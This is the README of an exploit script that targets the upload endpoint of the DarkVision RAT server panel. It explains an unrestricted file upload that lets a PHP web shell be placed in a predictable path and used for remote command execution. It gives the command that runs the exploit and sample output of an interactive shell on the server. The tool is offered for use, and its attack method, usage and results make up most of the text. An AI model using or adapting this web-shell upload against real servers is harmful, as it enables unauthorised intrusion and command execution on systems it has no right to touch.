# DarkVision RAT Password Recovery Vuln

## Summary

This script exploits a vulnerability in DarkVision RAT's upload endpoint that allows arbitrary file uploads. By exploiting this weakness, a malicious PHP shell can be uploaded and executed, granting the attacker remote command execution (RCE) on the server.

---

## How It Works

1. **File Upload**: The server fails to validate uploaded files, allowing attackers to upload executable PHP code.
2. **Dynamic Path**: The shell is stored in a predictable directory structure based on user-supplied `hwid` and `logfoldername` values.
3. **Command Execution**: The uploaded shell executes commands sent via HTTP GET parameters, enabling full RCE capabilities.

---

## Usage

### Installation
1. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

### Execution
Run the script with the following parameters:
- **`-u`, `--url`**: Target URL for the upload endpoint (required).
- **`-o`, `--hwid`**: HWID value for directory (optional, default: random).
- **`-l`, `--logfoldername`**: Log folder name (optional, default: random).

#### Example
```bash
python exploit.py -u https://example.com/upload.php -o randomHWID -l logsFolder123
```

---

## Result

1. The shell is uploaded to a directory like:
   ```
   https://example.com/uploads/randomHWID/logsFolder123/shell.php
   ```
2. An interactive terminal is opened to execute commands on the server.

---

```plaintext
[*] Uploading shell to the target...
[*] Shell uploaded successfully.
[+] Shell URL: https://example.com/uploads/randomHWID/logsFolder123/shell.php

╔═════════════════════════════════════════════════════════════╗
║               DarkVision RAT Vuln - Terminal                ║
╚═════════════════════════════════════════════════════════════╝

darkvision-vuln@remote $ whoami
www-data
darkvision-vuln@remote $ ls
index.php
config.php
shell.php
darkvision-vuln@remote $ exit
[*] Exiting the terminal. Goodbye!
```

---
